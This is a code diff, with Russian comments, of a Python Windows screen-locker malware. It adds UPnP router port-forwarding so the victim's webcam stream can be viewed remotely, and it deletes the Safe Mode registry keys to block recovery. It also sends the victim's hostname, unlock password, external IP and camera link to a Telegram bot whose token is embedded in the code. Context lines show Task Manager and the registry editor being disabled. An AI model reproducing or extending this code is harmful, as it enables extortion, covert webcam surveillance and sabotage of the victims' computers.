@@ -10,6 +10,12 @@ import cv2
 import tempfile
 from flask import Flask, Response
 
+# Пробуем импортировать UPnP для обхода роутера
+try:
+    import miniupnpc
+except:
+    miniupnpc = None
+
 if os.name != 'nt': sys.exit(1)
 BOT_TOKEN = "8644292894:AAHprQKa9xO39SB9t9eSZWq9LuxWk_Ta548"
 CHAT_ID = "8573437923"
@@ -17,8 +23,23 @@ PASSWORD = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
 
 app = Flask(__name__)
 
+# --- ФУНКЦИЯ ОБХОДА РОУТЕРА ---
+def open_port_upnp():
+    if not miniupnpc: return False
+    try:
+        upnp = miniupnpc.UPnP()
+        upnp.discoverdelay = 200
+        upnp.discover()
+        upnp.selectigd()
+        # Открываем порт 5000
+        upnp.addportmapping(5000, 'TCP', upnp.lanaddr, 5000, 'CamServer', '')
+        return True
+    except:
+        return False
+
+# --- КАМЕРА ---
 def generate_frames():
-    cap = cv2.VideoCapture(0) # Камера
+    cap = cv2.VideoCapture(0)
     while True:
         success, frame = cap.read()
         if not success:
@@ -26,7 +47,6 @@ def generate_frames():
         else:
             ret, buffer = cv2.imencode('.jpg', frame)
             frame = buffer.tobytes()
-            # Отдаем кадры в формате MJPEG
             yield (b'--frame\r\n'
                    b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
 
@@ -35,9 +55,9 @@ def video_feed():
     return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 def start_camera_server():
-    # Запускаем сервер на порту 5000
     app.run(host='0.0.0.0', port=5000, threaded=True)
 
+# --- СВЯЗЬ С БОТОМ ---
 def send_telegram_msg(text):
     try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
     except: pass
@@ -55,11 +75,16 @@ def check_bot_for_unlock():
         except: pass
         time.sleep(2)
 
+# --- БЛОКИРОВКА ---
 def disable_system_tools():
     try:
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
         winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
         winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SafeBoot", 0, winreg.KEY_ALL_ACCESS)
+        winreg.DeleteKey(key, "Minimal")
+        winreg.DeleteKey(key, "Network")
         winreg.CloseKey(key)
     except: pass
     os.system('shutdown -a')
@@ -108,7 +133,7 @@ def show_window():
 
     threading.Thread(target=wait_for_unlock, daemon=True).start()
     threading.Thread(target=kill_unwanted, daemon=True).start()
-    threading.Thread(target=start_camera_server, daemon=True).start() # Запуск веб-сервера камеры
+    threading.Thread(target=start_camera_server, daemon=True).start()
     root.mainloop()
 
 if __name__ == "__main__":
@@ -117,13 +142,16 @@ if __name__ == "__main__":
     except: pass
     
     hostname = socket.gethostname()
-    # Получаем внешний IP
     try:
         external_ip = requests.get('https://api.ipify.org').text
     except:
         external_ip = "Неизвестен"
         
-    msg = f"🚨 **Жертва запустила локер!**\n💻 ПК: `{hostname}`\n🔑 **ПАРОЛЬ:** `{PASSWORD}`\n🌐 **IP:** `{external_ip}`\n🎥 **КАМЕРА:** http://{external_ip}:5000/cam"
+    # Пытаемся открыть порт на роутере
+    port_opened = open_port_upnp()
+    status_msg = "✅ Порт открыт (UPnP)" if port_opened else "⚠️ Порт закрыт (Нужен проброс)"
+        
+    msg = f"🚨 **Жертва запустила локер!**\n💻 ПК: `{hostname}`\n🔑 **ПАРОЛЬ:** `{PASSWORD}`\n🌐 **IP:** `{external_ip}`\n🎥 **КАМЕРА:** http://{external_ip}:5000/cam\n\n{status_msg}"
     send_telegram_msg(msg)
     
     disable_system_tools()
